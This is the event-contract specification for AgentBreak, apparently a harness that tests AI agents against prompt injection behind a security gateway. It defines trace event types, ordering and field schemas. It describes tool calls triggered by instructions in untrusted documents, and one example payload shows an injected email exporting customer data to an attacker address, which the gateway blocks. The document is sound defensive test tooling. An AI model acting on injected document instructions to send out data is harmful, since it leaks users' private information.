# Event Contract

The AgentBreak trace format records every input, tool invocation, execution result, security decision, and output emitted during a trial.

---

## 1. Event Types (`EventType`)

| Type | Description |
|---|---|
| `agent_input` | The initial task prompt provided by the user. |
| `tool_request` | A request from the agent to call a specific tool. |
| `gateway_decision` | Evaluation outcome from the security gateway (allowed / blocked / pending). |
| `tool_result` | The synthetic execution result returned by the tool sandbox. |
| `sensitive_data_detected` | Flag emitted when sensitive data (e.g. canary secret, PII) is observed or redacted. |
| `final_output` | The agent's final text summary concluding the trial. |

---

## 2. Event Ordering Rule

For a gateway-defended trial, tool execution follows a strict sequence:
1. `tool_request`
2. `gateway_decision`
3. `sensitive_data_detected` *(optional: emitted if sensitive arguments are detected or output fields are redacted)*
4. `tool_result`

For blocked requests, the request is intercepted before tool dispatch:
- Inner executor dispatch is never called.
- `tool_result` records `execution_status: not_executed`, `decision: blocked`, the blocking `rule_id`, and `result: {"error": "Blocked by security gateway", "rule_id": <rule_id>}`.

---

## 3. Enumerations

### Decision
- `allowed`: Tool execution permitted by gateway policy.
- `blocked`: Tool execution intercepted and blocked by gateway policy.
- `pending_approval`: Tool execution awaiting approval.

### ExecutionStatus
- `executed`: Tool ran to completion.
- `not_executed`: Tool was blocked or skipped.
- `error`: Tool invocation failed or produced an execution error.

### Source
- `user_task`: Tool action originates from the legitimate user plan.
- `untrusted_document`: Tool action was triggered by instructions found inside an untrusted document.

---

## 4. Event Schema Fields (`TraceEvent`)

| Field | Type | Description |
|---|---|---|
| `event_id` | `str` | Unique, sequential event ID within trial (`evt_001`, `evt_002`, ...). |
| `run_id` | `str` | Associated run identifier (`run_...`). |
| `trial_id` | `str` | Associated trial identifier (`trial_...`). |
| `step` | `int` | Non-decreasing step counter. |
| `type` | `EventType` | Type of event. |
| `tool` | `str \| null` | Tool name (for tool events). |
| `arguments` | `dict \| null` | Arguments passed to the tool. |
| `source` | `Source \| null` | Provenance of the action (`user_task` or `untrusted_document`). |
| `decision` | `Decision \| null` | Gateway decision (`allowed` or `blocked`). |
| `execution_status` | `ExecutionStatus \| null` | Status of tool execution. |
| `rule_id` | `str \| null` | Security rule or safety harness rule triggered. |
| `result` | `dict \| null` | Structured outcome data. |
| `content` | `str \| null` | Text content for `agent_input` and `final_output`. |
| `timestamp` | `str` | ISO-8601 UTC timestamp. |

---

## 5. Result Payload Conventions

### `gateway_decision`
Carries a `result` dictionary with evaluation reason and all violated rules in priority order:
```json
{
  "reason": "Tool 'send_email' is not in permitted tools: ['read_document'].",
  "violations": ["tool_not_allowed", "recipient_not_allowed"]
}
```

### `sensitive_data_detected`
Carries a `result` dictionary with location and canary flag:
```json
{
  "fields": ["internal_notes"],
  "canary_present": true,
  "location": "tool_result"
}
```

---

## 6. Example Event Payloads

### Example: `gateway_decision` (Blocked)
```json
{
  "event_id": "evt_005",
  "run_id": "run_a1b2c3d4",
  "trial_id": "trial_e5f6a7b8",
  "step": 2,
  "type": "gateway_decision",
  "tool": "send_email",
  "arguments": {
    "to": "attacker@attacker.example.invalid",
    "subject": "Customer export",
    "body": "leaked data"
  },
  "source": "untrusted_document",
  "decision": "blocked",
  "rule_id": "tool_not_allowed",
  "result": {
    "reason": "Tool 'send_email' is not in permitted tools: ['read_document'].",
    "violations": ["tool_not_allowed", "recipient_not_allowed"]
  },
  "timestamp": "2026-10-10T09:30:00.180000Z"
}
```

### Example: `sensitive_data_detected` (Redacted)
```json
{
  "event_id": "evt_004",
  "run_id": "run_a1b2c3d4",
  "trial_id": "trial_e5f6a7b8",
  "step": 1,
  "type": "sensitive_data_detected",
  "tool": "search_customers",
  "rule_id": "sensitive_field_redacted",
  "result": {
    "fields": ["internal_notes"],
    "canary_present": true,
    "location": "tool_result"
  },
  "timestamp": "2026-10-10T09:30:00.170000Z"
}
```

### Example: `tool_result` (Blocked)
```json
{
  "event_id": "evt_006",
  "run_id": "run_a1b2c3d4",
  "trial_id": "trial_e5f6a7b8",
  "step": 2,
  "type": "tool_result",
  "tool": "send_email",
  "decision": "blocked",
  "execution_status": "not_executed",
  "rule_id": "tool_not_allowed",
  "result": {
    "error": "Blocked by security gateway",
    "rule_id": "tool_not_allowed"
  },
  "timestamp": "2026-10-10T09:30:00.190000Z"
}
```
